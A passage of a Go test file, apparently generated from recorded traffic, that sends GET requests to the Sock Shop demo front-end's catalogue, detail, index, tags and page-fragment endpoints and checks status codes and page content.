        amp_cache_transform1 := tt.(map[string]interface{})["amp_cache_transform1"]
        postman_token := tt.(map[string]interface{})["postman_token"]
        size := tt.(map[string]interface{})["size"]
        tags := tt.(map[string]interface{})["tags"]

        // GET http://front-end.sock-shop/catalogue (endp 11)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "page": "1",
            "size": size,
            "sort": "id",
            "tags": tags,
        })
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/catalogue")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$[*].tag[*]", resp.String()))
        id := JsonPath(t, "$[*].id", resp.String())

        // GET http://front-end.sock-shop/detail.html (endp 13)
        req2 := new(HttpRequest)
        req2.SetQueryString(map[string]interface{}{
            "id": id,
        })
        req2.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform1,
        })
        resp2 := frontEndSockShop.Get(req2, "/detail.html")
        assert.Equal(t, 200, resp2.StatusCode())
        assert.Contains(t, CssSelect(t, "div#content div.container div div.row.same-height-row div div.box.same-height h3", resp2), "You may also like these products")
    }
}

func TestGetFooterHtml039(t *testing.T) {
    // GET http://front-end.sock-shop/footer.html (endp 39)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "x-requested-with": "XMLHttpRequest",
    })
    resp := frontEndSockShop.Get(req, "/footer.html")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#copyright div.container div p.pull-left a", resp), "Weaveworks")
}

func TestGetIndexHtml064(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/64/dataset_64.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        findcli := tt.(map[string]interface{})["findcli"]
        postman_token := tt.(map[string]interface{})["postman_token"]

        // GET http://front-end.sock-shop/index.html (endp 64)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "findcli": findcli,
        })
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
        })
        resp := frontEndSockShop.Get(req, "/index.html")
        assert.Equal(t, 200, resp.StatusCode())
        assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
    }
}

func TestGetIpinfoIo240(t *testing.T) {
    // GET http://front-end.sock-shop/ipinfo.io (endp 240)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    resp := frontEndSockShop.Get(req, "/ipinfo.io")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGetTags041(t *testing.T) {
    // GET http://front-end.sock-shop/tags (endp 41)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "x-requested-with": "XMLHttpRequest",
    })
    resp := frontEndSockShop.Get(req, "/tags")
    assert.Equal(t, 200, resp.StatusCode())
}

func TestGetTags071(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/71/dataset_71.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        postman_token := tt.(map[string]interface{})["postman_token"]

        // GET http://front-end.sock-shop/tags (endp 71)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/tags")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$.tags[*]", resp.String()))
    }
}

func TestGetTopbarHtml042(t *testing.T) {
    // GET http://front-end.sock-shop/topbar.html (endp 42)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "x-requested-with": "XMLHttpRequest",
    })
    resp := frontEndSockShop.Get(req, "/topbar.html")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#top div.container div.offer a.btn.btn-success", resp), "Offer of the day")
}

func TestGetWww99synComIndexHtml243(t *testing.T) {
    // GET http://front-end.sock-shop/www.99syn.com/index.html (endp 243)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    resp := frontEndSockShop.Get(req, "/www.99syn.com/index.html")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}
